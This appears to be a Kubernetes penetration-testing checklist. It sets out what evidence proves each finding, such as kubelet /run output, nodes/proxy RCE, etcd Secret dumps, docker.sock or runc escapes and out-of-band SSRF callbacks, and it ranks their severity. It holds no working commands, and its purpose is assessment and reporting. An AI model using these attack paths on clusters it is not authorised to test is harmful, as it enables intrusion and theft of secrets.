- [ ] **Kubelet:** literal `id`/`hostname` output returned from 10250 `/run`, or a completed `/exec` stream — not a bare 302.
- [ ] **nodes/proxy RCE:** command output returned through `/api/v1/nodes/<node>/proxy/run/...` with your token.
- [ ] **etcd:** decoded Secret bytes shown (proves unencrypted + readable), not just a key listing.
- [ ] **docker.sock / escape:** the NODE's host file content retrieved (distinct from container), or runc-escape PoC output.
- [ ] **SA token:** `aud`/`exp` decoded and shown valid; impact bounded to its real RBAC.
- [ ] **OOB:** any outbound/SSRF hop confirmed via Collaborator/interactsh subdomain.

**Severity:**
- API anon→secret read, kubelet/nodes-proxy RCE, etcd dump, docker.sock/runc escape, CVE-2018-1002105: **Critical**
- Dashboard token-less data access, exposed Tiller: **High**
- Read-only kubelet 10255, anon `/version`/`/pods` info disclosure: **Medium**


